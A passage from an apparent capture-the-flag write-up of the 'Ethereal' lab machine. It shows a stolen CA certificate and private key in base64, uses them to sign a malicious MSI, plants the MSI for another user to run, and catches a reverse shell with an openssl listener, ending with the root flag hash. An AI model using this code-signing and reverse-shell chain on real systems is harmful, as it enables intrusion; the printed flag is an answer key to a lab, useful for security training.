NuPAuuLlMxpbSYE5Q1Gq8sRKdYnTMK9RfLnxa+N78qqR8R/MYr/RR4lKr2klwQm4
jWno4wAlqirjW5W7LDmBOsstNQIDAQABo1YwVDAPBgNVHRMBAf8EBTADAQH/MEEG
A1UdAQQ6MDiAEKuZwosHXc04qkkMrVgOXvShEjAQMQ4wDAYDVQQDEwVNeSBDQYIQ
IPZoDPLffoVFfuI8gqFGajANBgkqhkiG9w0BAQsFAAOCAQEAaJWYGIP0vCruQ7WP
43P0vFuwCmSLUYM+Edz+kQGBifhBnNsU+klJ18TWwazRGE4c72oAF+gNCAvfFKIq
2pbGUWaKnPzEO0znCg4pgdEIGHjNTePYngL0h76ItFlGOr4YttOIROflpk1dR6Cp
/1PwEOxZZ/9Kr9h1GVDiz2vcQW2VA8ALcgY584SKUkuKhE8Mqao78hU87e4dgXQL
KkqlkMYo7XeFa5MYZpiXCQNQNQIp1l7wAiA6mdaURtG6+PSoLZel8101iXYQbZUn
FAAiPQJ0lYyqerYP1tXtoSGUUEquiZFif3iU3VGA57L2repPbNIqOSOEmd47ZXT5
K9WXgA==

root@kali:~# base64 -d MyCA.cer.b64 > MyCA.cer
{% endhighlight %}

Decode MyCA.pvk:
{% highlight shell %}
root@kali:~# cat MyCA.pvk.b64 
HvG1sAAAAAACAAAAAAAAAAAAAACUBAAABwIAAAAkAABSU0EyAAgAAAEAAQA1Lcs6
gTksu5Vb4yqqJQDj6GmNuAnBJWmvSolH0b9izB/xkarye+Nr8bl8Ua8w04l1SsTy
qlFDOYFJWxoz5eK6wOM2fqIPDVdrIs6u/QGKT2sce/qD+vFBsX4FBzB3Dvl1USc8
1C5P3n9yiI+CqIFkAoKP+cSGp2+c5S9vGbo0LaeZqwR+Mv5V5JuuJlCm3w5bSJx7
HTktPfs8a0q/KKfa2hL/ShudaPN1qu33aE+4oXIAdUswaYbngjRiR/pCz+LBseQf
NZbM6tlWLCa2UpA/Wc+NWNkeS47hMm9GGne7641t7hFLt3MY7aBDuJ9auTMXoPgs
zkRmk7GQFpB8cM2dcZKSZIFgfu9cfUwrnXbTQC2BzNdRgmJGHW+KXCFns7ve/Cfh
UUSEOwv+aZwivMWic+lUA3MbVE73k5SrWWAa8HfhyRGeVkClWynddhknlufRz3VT
owT8YoHrpOey+EJ48NX5kbb/lIL0qTzd4DtWbLDSI1oW+Cj3hiuQ1unQU7wF4Ukf
7jv7zghW6Bp6LoUBFd9Dxw0Irs/aVRPyLWKv1Smk7rdiZ+Ym6/upHuLBaak4L/rM
qvzeT+hoV9JkdOckXA54tEf0SYoamH2+mFwSgmenHjdHEPjKOC1FJOGacC/bKB4z
iw0AoLPAwoK+ld57HMo1mexAEfvwua3rT6WB1pHtuKszTcsw2llLlAk3C2OU8sJS
+XPjsy4564WZZJurWx10vlhPUpdKTGbF/QV+5b02FQiyR5HkWBtqKHRVyEdZB0l5
VFFUXWZBzYc//AqSfPZg19VcrGS2B8rU6oK/5dA4djw9oeYzpQDD5q6z/GlGrLCt
iwGht0fcUveev2+20QfAHkGMmK1l9ymFdABCxLxQ3RbsaRwFffzwIO7hICSjIPwP
8Lfl9SbLP1TqUhfmcWhDPNgBjvgI2HuiXOTOjqgo+ML8AP4t5ctAOV3idNqGA+8o
QfqbZIwXW8t3DhRMOQ+y+7kZAG+0Tl4W+64Z+WbpV5NQ4Lh5zSDmy0H3NookmLbM
k/+6gRKfzGSnvlxR8+yngqaJoCYziE/+F3k293lHyGz7swQ+/Pgn4VnKXJPJTHwM
Gh7npszdDimChYLZhdo8VKSPdIe1aBcwzlxWhKe8zU39ktBCVB6COH+X2rRlNXiv
vvvesEbLeD0y2vFxjWxCT1IcNMSe+NWLrRLVV1FlLtjTp+uIk8158Et7Mi5/i2h3
ic+SiTxnQceaA9VJHLXEp3yO7hKMEpH9amU41EtFVStmiRoO3S3Bv3gGmZNKxZGJ
aocRCf2Rc0AjRB2xbshYFx4hCpDPdXCZRzDIjJjxQEfl1rLxQqA5rz3/3K8SyJSL
S79t8hzxlqwZvuMkL8LJzJi4m9Bt9sc2IxMdka4oAHAvKNpoOi6fZKINibMP69xK
g7lubG3/Aft9LYH2DpSSt00WyPIqFIscvOqkzrBlJHW4Dj65gsdsBqKIvb0hdfpf
myOjgtyxIuox7xHZOTg0TjoOnw1oMAdlBLaDfRz91TDwdd5N6T83QXLy3gY=

root@kali:~# base64 -d MyCA.pvk.b64 > MyCA.pvk
{% endhighlight %}

We have to create our .pfx file and .cer file for the signature.<br>
{% highlight shell %}
C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin>makecert.exe -n "CN=Ethereal" -pe -cy end -ic c:\tmp\MyCA.cer -iv c:\tmp\MyCA.pvk -sky signature -sv c:\tmp\ethereal.pvk c:\tmp\ethereal.cer
{% endhighlight %}

Makecert.exe requires password input but we don't need put anything ant click "ok"
![placeholder](https://inar1.github.io/public/images/2019-03-22/2019-03-20-17-16-24.png)

Then, execute following commands.
{% highlight shell %}
C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin>pvk2pfx.exe -pvk c:\tmp\ethereal.pvk -spc c:\tmp\ethereal.cer -pfx c:\tmp\ethereal.pfx

C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin>signtool.exe sign /f c:\tmp\ethereal.pfx c:\tmp\ethereal.msi
Done Adding Additional Store
Successfully signed: c:\tmp\ethereal.msi
{% endhighlight %}

After that, we have to upload the msi file. We can do this just like when we uploaded vs-mod.lnk.
{% highlight shell %}
C:\Users\jorge\Documents>copy c:\users\public\desktop\shortcuts\ethereal.msi d:\dev\msis\ethereal.msi & dir d:\dev\msis
        1 file(s) copied.
 Volume in drive D is Development
 Volume Serial Number is 54E5-37D1

 Directory of d:\dev\msis

03/21/2019  11:25 AM    <DIR>          .
03/21/2019  11:25 AM    <DIR>          ..
03/21/2019  10:34 AM           663,552 ethereal.msi
07/18/2018  09:47 PM               133 note.txt
               2 File(s)        663,685 bytes
               2 Dir(s)   8,436,850,688 bytes free
{% endhighlight %}

What we have to do is just rerun these ssl servers and wait for couple of minutes.<br>
After that, someone executes the uploaded msi and we can achieve a root shell.
{% highlight shell %}
root@kali:~# openssl s_server -quiet -key key.pem -cert cert.pem -port 136
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\>whoami
ethereal\rupal

C:\>dir c:\users\rupal\desktop
 Volume in drive C has no label.
 Volume Serial Number is FAD9-1FD5

 Directory of c:\users\rupal\desktop

10/10/2018  05:16    <DIR>          .
10/10/2018  05:16    <DIR>          ..
04/07/2018  22:01                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,406,366,720 bytes free

C:\>type c:\users\rupal\desktop\root.txt
1cb6f1fc220e3f2fcc0e3cd8e2d9906f
{% endhighlight %}
